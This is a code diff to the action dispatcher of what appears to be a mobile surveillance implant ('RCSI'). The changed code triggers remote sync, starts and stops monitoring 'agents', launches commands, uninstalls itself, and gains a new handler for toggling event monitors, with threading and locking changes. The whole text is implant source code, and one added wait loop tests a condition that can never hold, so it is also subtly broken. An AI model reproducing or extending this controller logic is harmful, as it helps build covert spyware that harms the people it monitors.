@@ -14,6 +14,7 @@
 #import "RESTNetworkProtocol.h"
 #import "RCSICommon.h"
 #import "RCSIInfoManager.h"
+#import <mach/mach.h>
 
 #define DEBUG_
 #define JSON_CONFIG
@@ -75,6 +76,7 @@ static RCSIActions  *sharedActionManager  = nil;
         {
           // allocated here and never released: al max count == 0
           mActionsMessageQueue = [[NSMutableArray alloc] initWithCapacity:0];
+          notificationPort = nil;
         }
       }
   }
@@ -107,15 +109,62 @@ static RCSIActions  *sharedActionManager  = nil;
 #pragma mark Action Dispatcher
 #pragma mark -
 
-- (BOOL)triggerAction: (int)anActionID
+- (void)synched
 {
+  @synchronized(self)
+  {
+    if (isSynching == TRUE)
+      isSynching = FALSE;
+  }
+}
+
+- (BOOL)synching
+{
+  BOOL success = FALSE;
+  
+  @synchronized(self)
+  {
+    if (isSynching == FALSE)
+      {
+        isSynching = TRUE;
+        success = TRUE;
+      }
+  }
+  
+  return success;
+}
+
+- (BOOL)tryTriggerAction:(int)anActionID
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  BOOL concurrent = FALSE;
+  
   RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
   
-  NSArray *configArray = [taskManager getConfigForAction: anActionID];
+  NSArray *configArray = [taskManager getConfigForAction: anActionID withFlag: &concurrent];
   
   if (configArray == nil)
     return FALSE;
+  else
+    {
+      if (concurrent == FALSE)
+        [self triggerAction: configArray];
+      else
+        {
+          [NSThread detachNewThreadSelector: @selector(triggerAction:) toTarget:self withObject:configArray];
+        }
+    }
+    
+  [pool release];
   
+  return TRUE;
+}
+
+- (BOOL)triggerAction: (NSArray*)configArray
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    
   NSMutableDictionary *configuration;
 
   for (configuration in configArray)
@@ -128,14 +177,15 @@ static RCSIActions  *sharedActionManager  = nil;
           {
             if ([[configuration objectForKey: @"status"] intValue] == 0)
               {
-              if (gAgentCrisis == NO) 
+              if (gAgentCrisis == NO && [self synching] == TRUE) 
                 {
                   NSNumber *status = [NSNumber numberWithInt: 1];
                   [configuration setObject: status forKey: @"status"];
-#ifdef DEBUG_
-                  NSLog(@"%s: synching %@", __FUNCTION__, configuration);
-#endif
+
                   [self actionSync: configuration];
+                  
+                  // synching done... reset flag
+                  [self synched];
                 }
               }
             break;
@@ -146,9 +196,7 @@ static RCSIActions  *sharedActionManager  = nil;
               {
                 NSNumber *status = [NSNumber numberWithInt: 1];
                 [configuration setObject: status forKey: @"status"];
-#ifdef DEBUG_
-              NSLog(@"%s: start agent %@", __FUNCTION__, configuration);
-#endif
+
                 [self actionAgent: configuration start: TRUE];
                 
               }          
@@ -171,9 +219,7 @@ static RCSIActions  *sharedActionManager  = nil;
               {
                 NSNumber *status = [NSNumber numberWithInt: 1];
                 [configuration setObject: status forKey: @"status"];
-#ifdef DEBUG_
-              NSLog(@"%s: uninstall", __FUNCTION__);
-#endif
+
                 [self actionUninstall: configuration];
               }          
             break;
@@ -184,7 +230,9 @@ static RCSIActions  *sharedActionManager  = nil;
               {
                 NSNumber *status = [NSNumber numberWithInt: 1];
                 [configuration setObject: status forKey: @"status"];
+                
                 [self actionInfo: configuration];
+                
                 status = [NSNumber numberWithInt: 0];
                 [configuration setObject: status forKey: @"status"];
               }
@@ -196,14 +244,27 @@ static RCSIActions  *sharedActionManager  = nil;
             {
               NSNumber *status = [NSNumber numberWithInt: 1];
               [configuration setObject: status forKey: @"status"];
-#ifdef DEBUG_
-              NSLog(@"%s: command", __FUNCTION__);
-#endif            
+           
               [self actionLaunchCommand: configuration];
               
               status = [NSNumber numberWithInt: 0];
               [configuration setObject: status forKey: @"status"];
             }
+            break;
+          }
+          case ACTION_EVENT:
+          {
+            if ([[configuration objectForKey: @"status"] intValue] == 0)
+              {
+                NSNumber *status = [NSNumber numberWithInt: 1];
+                [configuration setObject: status forKey: @"status"];
+                
+                [self actionEvent: configuration];
+                
+                status = [NSNumber numberWithInt: 0];
+                [configuration setObject: status forKey: @"status"];
+              }
+            
             break;
           }
           default:
@@ -212,6 +273,10 @@ static RCSIActions  *sharedActionManager  = nil;
           }
         }
     }
+  
+  [configArray release];
+  
+  [pool release];
   
   return TRUE;
 }
@@ -227,6 +292,7 @@ static RCSIActions  *sharedActionManager  = nil;
 - (BOOL)actionSync: (NSMutableDictionary *)aConfiguration
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
   [aConfiguration retain];
 
   NSData *syncConfig = [aConfiguration objectForKey: @"data"];
@@ -239,26 +305,6 @@ static RCSIActions  *sharedActionManager  = nil;
     {
 #ifdef DEBUG_ACTIONS
       errorLog(@"An error occurred while syncing with REST proto");
-#endif
-    }
-  else
-    {
-#ifdef JSON_CONFIG
-#else    
-      BOOL bSuccess = NO;
-      
-      RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
-      
-      NSMutableDictionary *agentConfiguration = [taskManager getConfigForAgent: AGENT_DEVICE];
-      
-      deviceStruct *tmpDevice = 
-      (deviceStruct*)[[agentConfiguration objectForKey: @"data"] bytes];
-      
-      if (tmpDevice != nil &&
-          tmpDevice->isEnabled == AGENT_DEV_ENABLED)
-        {          
-          bSuccess = [taskManager startAgent: AGENT_DEVICE];
-        }
 #endif
     }
   
@@ -341,10 +387,19 @@ static RCSIActions  *sharedActionManager  = nil;
   [[aConfiguration objectForKey: @"data"] getBytes: &agentID];
   
   if (aFlag == TRUE)
-    [taskManager startAgent: agentID];
-  else
-    [taskManager stopAgent: agentID];
-  
+    {
+#ifdef DEBUG
+      NSLog(@"%s: start agent %#x", __FUNCTION__, agentID);
+#endif
+      [taskManager startAgent: agentID];
+    }
+   else
+    {
+#ifdef DEBUG
+      NSLog(@"%s: stop agent %#x", __FUNCTION__, agentID);
+#endif
+     [taskManager stopAgent: agentID];
+    }
   NSNumber *status = [NSNumber numberWithInt: 0];
   [aConfiguration setObject: status forKey: @"status"];
   
@@ -429,6 +484,52 @@ static RCSIActions  *sharedActionManager  = nil;
   return TRUE;
 }
 
+typedef struct {
+  UInt32 enabled;
+  UInt32 event;
+} action_event_t;
+
+// FIXED-
+- (BOOL)actionEvent: (NSMutableDictionary *)aConfiguration
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSNumber *newStatus;
+  action_event_t *event;
+  
+  [aConfiguration retain];
+  
+  event = (action_event_t*)[[aConfiguration objectForKey: @"data"] bytes];
+  
+  if (event != nil)
+    {
+      if (event->enabled == TRUE) 
+        newStatus = [NSNumber numberWithInt: 1];
+      else
+        newStatus = [NSNumber numberWithInt: 0];
+      
+      NSMutableDictionary *anEvent = 
+      [[[RCSITaskManager sharedInstance] mEventsList] objectAtIndex: event->event];
+      
+      id anObject = [anEvent objectForKey: @"object"];
+      
+      if (anObject != nil)
+        {
+          @synchronized(anObject)
+          {  
+            if ([anObject respondsToSelector: @selector(setEnabled:)] == YES)
+              [anObject performSelector:@selector(setEnabled:) withObject:newStatus];
+          }
+        }
+    }
+  
+  [aConfiguration release];
+  
+  [pool release];
+  
+  return TRUE;
+}
+
 ///////////////////////////////////////////////////
 
 #pragma mark -
@@ -481,7 +582,7 @@ typedef struct _coreMessage_t
   
   memcpy(&actionID, [aData bytes], sizeof(int));
   
-  [self triggerAction: actionID];
+  [self tryTriggerAction: actionID];
   
   [pool release];
   
@@ -521,8 +622,19 @@ NSString *kRunLoopActionManagerMode = @"kRunLoopActionManagerMode";
 
 - (void)actionManagerRunLoop
 {
-  actionManagerStatus = ACTION_MANAGER_RUNNING;
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+
+  while (actionManagerStatus == ACTION_MANAGER_RUNNING &&
+         actionManagerStatus == ACTION_MANAGER_STOPPING)
+    { 
+#ifdef DEBUG
+      NSLog(@"%s: actionManagerRunLoop found alredy running", __FUNCTION__);
+#endif
+      sleep(1);
+    }
     
+  actionManagerStatus = ACTION_MANAGER_RUNNING;
+
   NSRunLoop *actionManagerRunLoop = [NSRunLoop currentRunLoop];
   
   notificationPort = [[NSMachPort alloc] init];
@@ -537,7 +649,7 @@ NSString *kRunLoopActionManagerMode = @"kRunLoopActionManagerMode";
       NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
       
       [actionManagerRunLoop runMode: kRunLoopActionManagerMode 
-                         beforeDate: [NSDate dateWithTimeIntervalSinceNow:1.5]];
+                         beforeDate: [NSDate dateWithTimeIntervalSinceNow:0.750]];
       
       // process incoming logs out of the runloop
       [self processIncomingActions];   
@@ -546,8 +658,11 @@ NSString *kRunLoopActionManagerMode = @"kRunLoopActionManagerMode";
     }
   
   // remove source port, release machport, remove action queue
-  [actionManagerRunLoop removePort:notificationPort forMode:kRunLoopActionManagerMode];
+  [actionManagerRunLoop removePort: notificationPort 
+                           forMode: kRunLoopActionManagerMode];
+  
   [notificationPort release];
+  notificationPort = nil;
   
   @synchronized(mActionsMessageQueue)
   {
@@ -556,6 +671,8 @@ NSString *kRunLoopActionManagerMode = @"kRunLoopActionManagerMode";
   
   // work is done: stop the manager
   actionManagerStatus = ACTION_MANAGER_STOPPED;
+  
+  [pool release];
 }
 
 - (void)start
